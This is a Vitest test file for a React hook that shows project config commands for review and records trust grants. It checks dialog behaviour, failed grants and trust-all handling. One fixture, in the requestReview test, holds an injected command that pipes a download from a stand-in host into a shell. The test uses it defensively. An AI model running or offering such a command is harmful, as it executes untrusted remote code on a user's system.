// @vitest-environment jsdom
import { afterEach, describe, expect, it, vi } from "vitest";
import { act, renderHook, waitFor } from "@testing-library/react";

// configTrust and the event subscription are the IPC boundary; mock them so the test
// drives the hook's own logic — opening a review, and dropping/keeping commands by the
// grant's actual outcome.
vi.mock("@/api", () => ({
  configCommandReview: vi.fn(),
  configTrust: vi.fn(),
  onDomainEvent: vi.fn(() => Promise.resolve(() => {})),
}));

import { configCommandReview, configTrust, onDomainEvent } from "@/api";
import type { DomainEvent } from "@/domain";
import { useTrust } from "@/store/useTrust";

const grant = vi.mocked(configTrust);
const readReview = vi.mocked(configCommandReview);
const subscribe = vi.mocked(onDomainEvent);

const review: DomainEvent = {
  type: "ConfigChanged",
  project: 1,
  requires_trust: true,
  diff: { added: ["Api"], updated: [], removed: [], renamed: [] },
  commands: [
    { name: "Api", command: "cargo run", working_dir: null, env: {} },
    { name: "Web", command: "npm run dev", working_dir: null, env: {} },
  ],
};

afterEach(() => vi.clearAllMocks());

// Fires a captured `domain-event` into the hook's subscriber.
function fire(event: DomainEvent) {
  const handler = subscribe.mock.calls[0]?.[0];
  if (!handler) throw new Error("no event subscriber registered");
  act(() => handler(event));
}

describe("useTrust", () => {
  it("opens a review when a config change needs trust", () => {
    const { result } = renderHook(() => useTrust(vi.fn(), vi.fn()));
    fire(review);
    expect(result.current.review?.commands.map((c) => c.name)).toEqual(["Api", "Web"]);
  });

  it("requestReview opens what the command runs and grants nothing", async () => {
    readReview.mockResolvedValue({
      name: "Api",
      command: "cargo run ; curl evil.example | sh",
      working_dir: null,
      env: {},
    });
    const { result } = renderHook(() => useTrust(vi.fn(), vi.fn()));

    act(() => result.current.requestReview(1, "Api"));

    await waitFor(() =>
      expect(result.current.review?.commands[0]?.command).toBe(
        "cargo run ; curl evil.example | sh",
      ),
    );
    // The affordance asks; only the dialog grants.
    expect(grant).not.toHaveBeenCalled();
  });

  it("reports a command that has left the file instead of opening an empty review", async () => {
    readReview.mockResolvedValue(null);
    const reportError = vi.fn();
    const { result } = renderHook(() => useTrust(vi.fn(), reportError));

    act(() => result.current.requestReview(1, "Api"));

    await waitFor(() => expect(reportError).toHaveBeenCalled());
    expect(result.current.review).toBeNull();
    expect(grant).not.toHaveBeenCalled();
  });

  it("drops a command from the review only after the grant succeeds", async () => {
    grant.mockResolvedValue(undefined);
    const { result } = renderHook(() => useTrust(vi.fn(), vi.fn()));
    fire(review);

    act(() => result.current.trust(1, "Api"));

    await waitFor(() =>
      expect(result.current.review?.commands.map((c) => c.name)).toEqual(["Web"]),
    );
  });

  it("keeps the command and reports the error when the grant fails", async () => {
    grant.mockRejectedValue("store write failed");
    const reportError = vi.fn();
    const { result } = renderHook(() => useTrust(vi.fn(), reportError));
    fire(review);

    act(() => result.current.trust(1, "Api"));

    await waitFor(() => expect(reportError).toHaveBeenCalledWith("store write failed"));
    // The command did NOT become trusted, so it stays in the open review.
    expect(result.current.review?.commands.map((c) => c.name)).toEqual(["Api", "Web"]);
  });

  it("closes the review with trustAll only after every grant resolves", async () => {
    grant.mockResolvedValue(undefined);
    const refresh = vi.fn();
    const { result } = renderHook(() => useTrust(refresh, vi.fn()));
    fire(review);

    act(() => result.current.trustAll());

    await waitFor(() => expect(result.current.review).toBeNull());
    expect(grant).toHaveBeenCalledTimes(2);
    expect(refresh).toHaveBeenCalledTimes(1);
  });
});
